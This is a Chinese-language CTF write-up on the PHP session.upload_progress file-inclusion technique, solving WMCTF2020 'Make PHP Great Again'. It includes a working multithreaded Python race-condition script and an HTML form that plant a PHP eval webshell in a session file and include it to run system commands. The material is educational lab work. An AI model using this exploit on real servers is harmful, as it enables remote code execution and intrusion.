## session.upload_progress文件包含漏洞

### 前言

之前学习了该漏洞，但是没有做笔记，导致容易遗忘。在此用一个题目来理解`session.upload_progress`漏洞



### 基础知识

#### session存储

我们在phpinfo可以看到session的存储路径：

![image-20230601203121482](https://s2.loli.net/2023/06/01/WlKLS3Egwzxurjs.png)

以下是一些session在linux的默认存储路径

```php
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

session文件的文件名一般是通过：`sess_` 加上`PHPSESSID`字段  



#### 什么是session.upload_progress

以下是`session.upload_progress`比较重要的几个选项：

```php
session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

- session.upload_progress.enabled可以控制是否开启session.upload_progress功能
- session.upload_progress.cleanup可以控制是否在上传之后删除文件内容
- session.upload_progress.prefix可以设置上传文件内容中的前缀
- session.upload_progress.name的值即为session中的键值

`session.auto_start`：如果开启这个选项，则PHP在接收请求的时候会**自动初始化Session**，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是**默认关闭**的。

`session.upload_progress.cleanup = on`：表示当文件上传结束后，php将会立即清空对应session文件中的内容。该选项**默认开启**

`session.use_strict_mode`：默认情况下，该选项的值是0，此时用户可以自己定义Session ID





### session.upload_progress开启后有什么效果

> 当我们将`session.upload_progress.enabled`的值设置为**on**时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。

**问题1：**

那么这个时候就会有一个前提条件，就是如何初始化session并且把session中的内容写到文件中去呢？

**分析1：**

我们可以注意到，php.ini中`session.use_strict_mode`选项默认是0，在这个情况下，用户可以自己定义自己的sessionid，例如当用户在cookie中设置`PHPSESSID=leekos`时，PHP就会生成一个文件`/tmp/sess_leekos`，此时也就初始化了session，并且会将上传的文件信息写入到文件`/tmp/sess_leekos`中去，具体文件的内容是什么，后面会写到。

**问题2：**

当session.upload_progress.cleanup的值为on时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？

**分析2：**

利用Python的多线程，进行**条件竞争**。

> 当一个网站存在文件包含漏洞，但是并没有用户会话。即代码层未输入`session_start()`。
> 可借助Session Upload Progress，因为session.upload_progress.name 是用户自定义的，POST提交PHP_SESSION_UPLOAD_PROGRESS字段，只要上传包里带上这个键，PHP就会自动启用Session。同时在Cookie中设置PHPSESSID的值。这样，请求的文件内容和命名都可控。
>
> 当文件上传结束后，php会立即清空对应session文件中的内容，这会导致我们包含的很可能只是一个空文件，所以我们要利用条件竞争，在session文件被清除之前利用。



### 如何使用session.upload_progress进行RCE？

当一个网站存在文件包含漏洞时，我们可以尝试通过`session.upload_progress` 向服务器写入session文件，文件内容为一句话木马，然后配合文件包含漏洞包含进来，然后getshell

但是如果选项：`session.upload_progress.cleanup=on`那么文件一上传上去就会被删除，所以我们需要利用条件竞争

有两种方式：

- 1、使用python脚本
- 2、使用burpsuite

首先我们结合一道例题来讲解：

#### [WMCTF2020]Make PHP Great Again

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

此处存在文件包含漏洞，由于使用了 `require_once()`所以我们不能再次包含flag.php

这里可以使用 `session.upload_progress` 进行rce

##### 使用python脚本：

```php
import io
import threading
import requests

url = "http://40c7dd6c-b2cb-4356-820b-cd6ba4f81596.node4.buuoj.cn:81/"
sessid = 'leekos'

def write(session):

    filebytes = io.BytesIO(b'a'*1024*50)
    while True:
        session.post(url=url,data = {
            'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'
        },cookies={
            'PHPSESSID':sessid
        },files={
            'file': ('leekos.jpg',filebytes)
        })


def read(session):

    while True:
        res1 = session.post(url=url + r'?file=/tmp/sess_' + sessid, data={
            '1': r"system('tac flag.php');"
        })
        if 'leekos' in res1.text:
            print(res1.text)
        else:
            print("retry~~~~")


if __name__ == '__main__':
    with requests.session() as session:
        for i in range(20):
            threading.Thread(target=write,args=(session,)).start()
        for i in range(20):
            threading.Thread(target=read,args=(session,)).start()
```

这段代码的逻辑其实不难，得好好补一补python

首先我们创建一个 `session`对象，用来发送http请求

然后使用python中多线程 `threading.Thread()` 创建多线程并启动然后调用 write、read

- write()函数逻辑：首先使用`io.BytesIO(b'a'*1024*50)`创建一段50kB大小的文件，然后发送post包，url为域名，data的键名传入：`PHP_SESSION_UPLOAD_PROGRESS` 值传入一句话木马，然后cookie控制`PHSESSID`的值为leekos，files传入刚创建的文件。这样就会在服务器 `/tmp`目录创建一个文件名为：`sess_leekos`的文件，并且内容包含一句话木马
- read()函数逻辑，去读 `/tmp/sess_leekos`文件的值，并且data中传入代码获取flag。由于session文件的内容中包含我们上传的文件的名称（此时为：leekos.jpg）如果读取出来的结果包含leekos，说明之前的session上传成功了，于是我们打印出页面的值，其中一定包含flag

使用多线程不断的竞争，一段时间后就会得到flag

![image-20230601210701486](https://s2.loli.net/2023/06/01/xLnHMGSRYuaJ59f.png)



##### 使用html+bp

写一个html

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="http://40c7dd6c-b2cb-4356-820b-cd6ba4f81596.node4.buuoj.cn:81/" method="post" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php eval($_POST[1]);?>">
        <input type="file" name="file">
        <input type="submit" name="submit">
    </form>
</body>
</html>
```

上传文件，抓包，修改`cookie:PHPSESSID=leekos`

![image-20230601212928962](https://s2.loli.net/2023/06/01/JjLhp7enokFA84f.png)

然后使用另一个请求包含：

![image-20230601212949130](https://s2.loli.net/2023/06/01/jLzxiv4u6Id7cnw.png)

两个请求使用 `Intruder`模块竞争：

![image-20230601213038646](https://s2.loli.net/2023/06/01/1Yej2HK8TtqoANn.png)

这样就成功了





